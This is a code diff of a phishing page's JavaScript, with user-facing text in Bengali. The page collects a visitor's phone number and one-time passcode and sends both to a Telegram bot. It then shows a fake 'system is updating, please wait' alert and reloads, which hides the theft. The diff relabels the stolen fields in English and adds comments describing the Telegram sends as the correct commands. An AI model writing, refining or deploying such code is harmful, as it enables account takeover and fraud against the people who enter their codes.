@@ -15,16 +15,18 @@ function goToStep2() {
     document.getElementById('step2').style.display = 'block';
     document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";
 
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 নম্বর: " + userPhone)}`);
+    // টেলিগ্রামে নম্বর পাঠানোর সঠিক কমান্ড
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 Number: " + userPhone)}`);
 }
 
 document.getElementById('mainForm').addEventListener('submit', function(e) {
     e.preventDefault();
     const otpInput = document.getElementById('otp').value;
     
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✅ ওটিপি: " + otpInput + "\nনম্বর: " + userPhone)}`)
+    // টেলিগ্রামে ওটিপি পাঠানোর সঠিক কমান্ড
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✅ OTP: " + otpInput + "\nNumber: " + userPhone)}`)
     .then(() => {
-        alert("সিস্টেম আপডেট হচ্ছে...");
+        alert("সিস্টেম আপডেট হচ্ছে, অপেক্ষা করুন...");
         window.location.reload();
     });
 });
